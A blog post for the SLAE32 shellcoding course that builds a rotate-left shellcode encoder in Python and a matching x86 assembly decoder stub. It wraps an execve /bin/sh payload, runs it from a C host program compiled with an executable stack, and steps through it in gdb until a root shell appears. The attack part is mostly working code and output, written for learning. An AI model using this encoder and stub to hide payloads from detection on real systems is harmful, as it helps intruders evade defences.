---
title: SLAE32 Assignment 4 -- Rotation Encoder
date: 2019-9-15
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE32.jpg
tags:
  - rotate
  - Encoder
  - Decoder
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
## Overview
For my fourth assignment in the SLAE32 course, I created a custom Rotation Encoder.   
+ How this works is to encode the payload, it rotates every bit to the left by one. 
  - If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1).
#### Encode 
![](/assets/images/rotateLeft.png)  
+ To decode, all the bits are rotated to the right by one. 
  - If there is a low bit, it is moved to the highest bit.  
#### Decode
![](/assets/images/rotateRight.png)   

## Encoding the Payload
The payload used for this example is the `execve` shellcode; provided in the SLAE course.  

### Grabbing the Payload Shellcode
#### Shellscript for automation
```bash
#!/bin/bash
# Filename: objdump2hex.sh
# Author:   boku
OBJFILE=$1
objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file'\
| cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
| sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s \
| sed 's/^/"/' | sed 's/$/"/g'
```
+ To quickly grab the hex from shellcode, I used the method shown in the SLAE course.   
+ To make it easier, I added it to a shellscript.  

#### Using the Script to get the Payload Shellcode
```bash
root@zed# ./objdump2hex.sh execve-stack 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```
+ Perfect. Now we will need to encode this shellcode using our Python Encoder `rotateLeftEncoder.py`.  

### Encoding the Payload with the Encoder

#### Python Encoder
```python
#!/usr/bin/python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
shellcode += "\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1"
shellcode += "\xb0\x0b\xcd\x80"
encoded1 = ""
encoded2 = ""
for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded1 += '\\x'
        encoded1 += '%02x' %x   # Add the rotated left hex to string 
        encoded2 += '0x'
        encoded2 += '%02x,' %x  # Add the rotated left hex to string 
    else:
        encoded1 += '\\x'       # No leftmost bit, just rotate
        encoded1 += '%02x' %(x << 1)
        encoded2 += '0x'        # No leftmost bit, just rotate
        encoded2 += '%02x,' %(x << 1)
print encoded1
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
```
+ The new encoded shellcode is output in both the `\x` format and the `0x, ` format.  
+ As you can see in the top section, all that needs to be done to change the shellcode payload is replace the string in the `shellcode` array.  

#### Executing the Encoder
```bash
root# python rotateLeftEncoder.py
\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e\xc4\xd2\xdc
\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01                   

0x62,0x81,0xa0,0xd0,0x5e,0x5e,0xe6,0xd0,0xd0,0x5e,0xc4,\
0xd2,0xdc,0x13,0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
0x16,0x9b,0x01
Len: 25
# Add 0xff to the end of the payload
```
+ Our encoded shellcode payload is `25 bytes`. 
+ We will need to add a final byte to the end `0xff`.  
  - This byte will be used by our decoder to let it know it has reached the end of our payload.  
+ We will copy the second output with the `0x, ` format, to our nasm program after appending the byte.  

## Decoding the Payload
+ This assembly program will use the `JMP|Call|POP` technique to put the memory location of our encoded string into the ESI Register.
+ Once in the ESI Register, we will decode our payload byte-by-byte.

#### The Decoder
```nasm
; Filename: rotateRightDecoder.nasm
; Author:   boku

global _start

section .text
_start:
  jmp short call_decoder ; 1. jump to where the shellcode string is

decoder: 
  pop esi                ; 3. Put string location in esi register

decode:
  ror byte [esi], 1      ; 4. decode the byte by bitwise rotate right
  cmp byte [esi], 0xFF   ; 5. Is this the last byte?
  je Shellcode           ;    - If so jump into the payload and execute
  inc esi                ; 6. Not end? Move forward 1 byte
  jmp short decode       ; 7. Lets decode the next byte
        
call_decoder:
  call decoder           ; 2. Put the mem location of the string on the stack
  Shellcode: db 0x62,0x81,0xa0,0xd0,0x5e,0x5e,\
      0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,\
      0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
      0x16,0x9b,0x01,0xff
```
+ The instruction `jmp short decode` is an unconditional jump. We use this to create the loop to decode our shellcode.  
+ `ror byte [esi], 1` 
  - rotate to the right one bit, one byte at a time, 
+ If the decoded byte is `\xff` then we will jump to the shellcode using the instruction `je Shellcode`.
+ If the byte is not `\xff` then the zero flag will not be set, and that jump will be ignored.   
+ Now that both the decoder and encoder are created, the last thing to do is compile and test.  

# Testing the Decoder
## Compiling Shellcode and Host Program
#### Compiling the Decoder
```bash
nasm -f elf32 rotateRightDecoder.nasm -o rotateRightDecoder.o
ld -o rotateRightDecoder rotateRightDecoder.o
```
+ To compile my Assembly code I used the NASM Compiler with these commands. After creating the object file with NASM, I linked the object file using `ld`.  
+ Trying to run the decoder itself fails with a segmentation dump.
+ We will extract the hex code using the objdump cl-fu method above and inject it into a host program.

#### Extracting the Hex from the Decoder
```console
root# objdump -d 4-rolDecoder | grep '[0-9a-f]:' | \
grep -v 'file'| cut -f2 -d: | cut -f1-6 -d' ' | \
tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | \
sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | \
sed 's/$/"/g' 
"\xeb\x0b\x5e\xd0\x0e\x80\x3e\xff\x74\x08\x46\xeb\xf6\xe8"
"\xf0\xff\xff\xff\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e"
"\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b"
"\x01\xff"
```
+ Now we will load this into our `shellcode.c` host program.

#### Shellcode.c Host Program
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x0b\x5e\xd0\x0e\x80\x3e\xff\x74\x08\x46\xeb\xf6\xe8"
"\xf0\xff\xff\xff\x62\x81\xa0\xd0\x5e\x5e\xe6\xd0\xd0\x5e"
"\xc4\xd2\xdc\x13\xc7\xa0\x13\xc5\xa6\x13\xc3\x61\x16\x9b\x01\xff";
main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
+ I tested the shellcode using the C program shown in the SLAE course.   
+ After extracting the shellcode using the above bash script, I added it to the C program as the `code[]` array.  

#### Compiling Host C Program
```console
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```

## Analyzing with gdb
#### gdb setup
```console
root# gdb ./shellcode
gdb-peda$ info variables
  0x0804a040  code
gdb-peda$ b *0x0804a040
  Breakpoint 1 at 0x804a040
gdb-peda$ run
  
# Current Instruction
=> 0x804a040 <code>:    jmp    0x804a04d <code+13>
```
+ Here we see the program being run with gdb.
+ A breakpoint was set for when the program starts to execute the instructions at the `code[]` array varaible.
+ We see that our program successfully stopped at the break-point.
+ After the jump we will do a call, which will load the memory address of our encoded execve program on to the top of the stack.

### Stepping Through the Decoder with gdb
#### Decoder `JMP|Call|POP`
```console
# Break-Point
# Jump
=> 0x804a040 <code>:    jmp    0x804a04d <code+13>

# step into with si
gdb-peda$ si
# Call
=> 0x804a04d <code+13>: call   0x804a042 <code+2>
# Pop
   0x804a042 <code+2>:  pop    esi
# Decode with Rotate Right
=> 0x804a043 <code+3>:  ror    BYTE PTR [esi],1
# Check end of encoded payload
   0x804a045 <code+5>:  cmp    BYTE PTR [esi],0xff
```
+ Here we can see our `JMP|Call|POP` instructions being executed.
  - This loads the address of our encoded payload into the `esi` register.
+ After decoding `1 byte` we can see that our decoder checks to see if it is at the end.

#### Decode First Byte
```console
# First Encoded Byte
gdb-peda$ x/c $esi
0x804a052 <code+18>:    0x62
# Instructions to Decode First Byte
   0x804a043 <code+3>:  ror    BYTE PTR [esi],1
=> 0x804a045 <code+5>:  cmp    BYTE PTR [esi],0xff
# First Decoded Byte
gdb-peda$ x/c $esi
0x804a052 <code+18>:    0x31
```
+ We see that our first byte encoded byte was successfully decoded.

#### Decoding all the Bytes
```console
=> 0x804a048 <code+8>:  je     0x804a052 <code+18>
# JUMP is NOT taken
   0x804a04a <code+10>: inc    esi
=> 0x804a04b <code+11>: jmp    0x804a043 <code+3>
# JUMP is taken
```
+ To move to the next byte in our encoded payload string we use the instruction `inc esi`.
+ We go through this 26 more times until we reach the byte `0xff`.

#### Finding the End of Payload
```console
   0x804a043 <code+3>:  ror    BYTE PTR [esi],1
=> 0x804a045 <code+5>:  cmp    BYTE PTR [esi],0xff
=> 0x804a048 <code+8>:  je     0x804a052 <code+18>
# JUMP is taken
=> 0x804a052 <code+18>: xor    eax,eax
```
+ `0xff` rotated either way, any amount of times, is always `0xff`.
+ After reaching the final byte `0xff` we jump into our decoded payload.

#### Injected Shellcode at time of Execve Payload Execution
```console
[------------------registers------------------]
EAX: 0xb ('\x0b')
EBX: 0xbffff500 ("/bin//sh")
ECX: 0xbffff4f8 --> 0xbffff500 ("/bin//sh")
EDX: 0xbffff4fc --> 0x0

[---------Current-Instruction-----------------]
=> 0x804a069 <code+41>: int    0x80
0000| 0xbffff4f8 --> 0xbffff500 ("/bin//sh")
0004| 0xbffff4fc --> 0x0
0008| 0xbffff500 ("/bin//sh")
0012| 0xbffff504 ("//sh")
0016| 0xbffff508 --> 0x0

# Execute the Execve 0x80 systemcall
gdb-peda$ si
process 27199 is executing new program: /bin/dash
# whoami
[New process 788]
process 788 is executing new program: /usr/bin/whoami
root
```
+ We see we successfully decoded and executed our execve payload.

## Testing without gdb
```console
root# ./shellcode
Shellcode Length:  44
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```
+ Boom! Our decoded works!


